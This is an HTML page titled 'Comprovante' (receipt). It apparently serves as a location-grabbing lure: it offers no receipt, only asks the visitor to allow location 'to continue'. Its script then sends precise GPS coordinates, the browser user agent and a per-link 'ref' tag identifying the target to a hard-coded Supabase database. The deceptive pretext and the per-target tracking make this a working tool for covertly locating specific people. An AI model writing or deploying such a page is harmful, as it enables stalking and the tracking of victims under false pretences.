<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>Comprovante</title>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
      font-family: Arial, Helvetica, sans-serif;
      background: #f5f6f8;
      color: #222;
    }

    .card {
      width: 100%;
      max-width: 420px;
      background: #ffffff;
      border-radius: 18px;
      padding: 40px 28px;
      text-align: center;
      box-shadow: 0 15px 40px rgba(0, 0, 0, 0.08);
    }

    h1 {
      margin: 0 0 14px;
      font-size: 28px;
      color: #111827;
    }

    p {
      margin: 0 0 28px;
      font-size: 16px;
      line-height: 1.5;
      color: #4b5563;
    }

    button {
      width: 100%;
      border: 0;
      border-radius: 12px;
      padding: 16px;
      background: #111827;
      color: #ffffff;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      transition: 0.2s;
    }

    button:hover {
      background: #1f2937;
    }

    button:disabled {
      opacity: 0.7;
      cursor: wait;
    }

    #mensagem {
      margin-top: 18px;
      font-size: 14px;
      line-height: 1.5;
      display: none;
    }

    .erro {
      color: #dc2626;
    }

    .sucesso {
      color: #16a34a;
    }
  </style>
</head>

<body>

  <div class="card">

    <h1>Comprovante</h1>

    <p>
      Permitir localização para continuar.
    </p>

    <button id="btnLocalizacao">
      Permitir Localização
    </button>

    <div id="mensagem"></div>

  </div>


  <script>

    // =====================================================
    // CONFIGURAÇÃO DO SUPABASE
    // =====================================================

    const SUPABASE_URL =
      "https://gotszlmzwkhyymtpnkwp.supabase.co";

    const SUPABASE_KEY =
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdvdHN6bG16d2toeXltdHBua3dwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODg5NTQ3NjYsImV4cCI6MjEwNDUzMDc2Nn0.HjF8uEBmPw-4rcLf8ZajIit1lhekrhNIvkXbjWEtftg";


    // =====================================================
    // REFERÊNCIA DO LINK
    //
    // Exemplo:
    // seu-site.vercel.app/?ref=ABC123
    // =====================================================

    const parametros =
      new URLSearchParams(window.location.search);

    const referencia =
      parametros.get("ref") || null;


    // =====================================================
    // ELEMENTOS DA PÁGINA
    // =====================================================

    const botao =
      document.getElementById("btnLocalizacao");

    const mensagem =
      document.getElementById("mensagem");


    // =====================================================
    // MOSTRAR MENSAGEM
    // =====================================================

    function mostrarMensagem(texto, tipo) {

      mensagem.textContent = texto;
      mensagem.className = tipo;
      mensagem.style.display = "block";

    }


    // =====================================================
    // ENVIAR LOCALIZAÇÃO PARA O SUPABASE
    // =====================================================

    async function enviarLocalizacao(posicao) {

      const latitude =
        posicao.coords.latitude;

      const longitude =
        posicao.coords.longitude;

      const precisao =
        posicao.coords.accuracy;


      const dados = {

        referencia: referencia,

        latitude: latitude,

        longitude: longitude,

        precisao_metros:
          precisao || null,

        user_agent:
          navigator.userAgent,

        ip_address:
          null,

        capturado_em:
          new Date().toISOString()

      };


      try {

        const resposta = await fetch(

          `${SUPABASE_URL}/rest/v1/localizacoes`,

          {

            method: "POST",

            headers: {

              "Content-Type":
                "application/json",

              "apikey":
                SUPABASE_KEY,

              "Authorization":
                `Bearer ${SUPABASE_KEY}`,

              "Prefer":
                "return=minimal"

            },

            body:
              JSON.stringify(dados)

          }

        );


        if (!resposta.ok) {

          const erro =
            await resposta.text();

          console.error(
            "Erro Supabase:",
            erro
          );

          throw new Error(
            "Erro ao enviar localização."
          );

        }


        // =================================================
        // SUCESSO
        // =================================================

        mostrarMensagem(
          "Localização autorizada.",
          "sucesso"
        );

        botao.disabled = true;

        botao.textContent =
          "Localização Autorizada";


      } catch (erro) {

        console.error(erro);

        mostrarMensagem(
          "Não foi possível concluir. Tente novamente.",
          "erro"
        );

        botao.disabled = false;

        botao.textContent =
          "Permitir Localização";

      }

    }


    // =====================================================
    // TRATAMENTO DOS ERROS DE LOCALIZAÇÃO
    // =====================================================

    function erroLocalizacao(erro) {

      console.error(
        "Erro de geolocalização:",
        erro
      );


      botao.disabled = false;

      botao.textContent =
        "Permitir Localização";


      // Usuário negou a permissão
      if (erro.code === 1) {

        mostrarMensagem(
          "A localização é necessária. Permita o acesso à localização e tente novamente.",
          "erro"
        );

      }


      // Localização indisponível
      else if (erro.code === 2) {

        mostrarMensagem(
          "Não foi possível determinar sua localização. Tente novamente.",
          "erro"
        );

      }


      // Tempo esgotado
      else if (erro.code === 3) {

        mostrarMensagem(
          "A localização demorou muito para responder. Tente novamente.",
          "erro"
        );

      }


      // Outro erro
      else {

        mostrarMensagem(
          "Não foi possível obter sua localização. Tente novamente.",
          "erro"
        );

      }

    }


    // =====================================================
    // BOTÃO DE LOCALIZAÇÃO
    // =====================================================

    botao.addEventListener(
      "click",
      function () {

        mensagem.style.display = "none";


        // Verifica se o navegador suporta localização

        if (!navigator.geolocation) {

          mostrarMensagem(
            "Seu navegador não oferece suporte à localização.",
            "erro"
          );

          return;

        }


        botao.disabled = true;

        botao.textContent =
          "Aguardando permissão...";


        // =================================================
        // SOLICITA A PERMISSÃO
        //
        // O envio ao Supabase NÃO acontece aqui.
        //
        // Ele só acontecerá dentro do primeiro callback,
        // depois que o navegador fornecer a localização.
        // =================================================

        navigator.geolocation.getCurrentPosition(

          // ===============================================
          // PERMISSÃO CONCEDIDA
          // ===============================================

          function (posicao) {

            botao.textContent =
              "Enviando...";


            // Somente após obter a localização,
            // envia para o Supabase.

            enviarLocalizacao(posicao);

          },


          // ===============================================
          // PERMISSÃO NEGADA OU OUTRO ERRO
          // ===============================================

          erroLocalizacao,


          // ===============================================
          // CONFIGURAÇÕES
          // ===============================================

          {

            enableHighAccuracy: true,

            timeout: 30000,

            maximumAge: 0

          }

        );

      }
    );

  </script>

</body>
</html>
